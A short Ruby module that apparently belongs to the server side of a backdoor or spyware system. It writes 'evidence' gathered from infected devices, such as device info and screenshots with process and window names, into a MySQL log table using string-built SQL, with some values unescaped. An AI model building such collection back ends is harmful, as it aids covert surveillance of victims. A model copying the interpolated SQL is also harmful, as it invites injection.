#
# Mix-in for DB Layer
#

module DBLayer
module Evidence
  
  def evidence_store(evidence)
    trace :info, "storing evidence #{evidence.info[:type]}"
    
    case evidence.info[:type]
      when :DEVICE, :INFO
        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, longtext1)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 0,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:content].to_s)}')"
      when :SNAPSHOT
        q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `varchar1`, `varchar2`, `int1`, `longblob1`)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 0,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:process_name])}',
                 '#{@mysql.escape(evidence.info[:window_name])}',
                 #{evidence.info[:content].size},
                 '#{@mysql.escape(evidence.info[:content])}')"
      else
        trace :debug, "Not implemented."
        return nil
    end
    
    return mysql_query(q)
  end
  
end # ::Evidence
end # ::DBLayer
